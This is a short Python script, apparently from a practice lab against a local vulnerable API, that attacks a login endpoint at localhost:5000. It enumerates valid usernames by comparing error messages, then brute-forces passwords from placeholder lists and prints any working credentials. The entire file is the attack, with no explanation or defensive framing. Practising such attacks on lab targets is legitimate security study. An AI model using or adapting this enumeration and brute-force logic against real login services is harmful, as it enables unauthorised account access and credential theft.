import requests

user_error_message = "Username does not exist"
password_error_message = "Password is not correct for the given username."

users_list = ["name1", "name2", "name3", "name4", "name5","admin"]
pass_list = ["pass1", "pass2", "pass3", "pass4", "pass5","admin"]

for user in users_list:
    for password in pass_list:
        data = {
            "username": user,
            "password": password
        }
        response = requests.post("http://localhost:5000/users/v1/login", json=data)
        body = response.json()
        if body["message"] == password_error_message:
            print(f"User {user} does exist, checking passwords")
        elif body["message"] == "Successfully logged in.":
            print(f"Found {user} with password {password}")
        else:
            break